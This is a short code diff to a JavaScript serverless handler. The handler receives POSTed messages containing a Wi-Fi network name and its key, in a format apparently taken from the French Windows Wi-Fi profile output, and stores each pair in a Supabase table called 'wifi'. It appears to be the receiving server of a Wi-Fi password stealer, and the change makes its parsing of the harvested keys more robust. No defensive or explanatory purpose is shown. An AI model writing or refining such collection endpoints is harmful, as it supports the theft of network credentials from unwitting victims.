@@ -9,12 +9,12 @@ exports.handler = async (event) => {
     if (event.httpMethod === "POST") {
         const params = new URLSearchParams(event.body);
         const message = params.get("message");
-        const [reseau, mot_de_passe] = message.split(" | Contenu de la clé            : ");
 
-        await supabase.from("wifi").insert([{
-            reseau: reseau.replace("Réseau: ", ""),
-            mot_de_passe: mot_de_passe
-        }]);
+        const reseau = message.split(" | ")[0].replace("Réseau: ", "").trim();
+        const brut = message.split(" | ")[1] || "";
+        const mot_de_passe = brut.includes(":") ? brut.split(":").slice(1).join(":").trim() : brut.trim();
+
+        await supabase.from("wifi").insert([{ reseau, mot_de_passe }]);
 
         return { statusCode: 200, body: JSON.stringify({ success: true }) };
     }
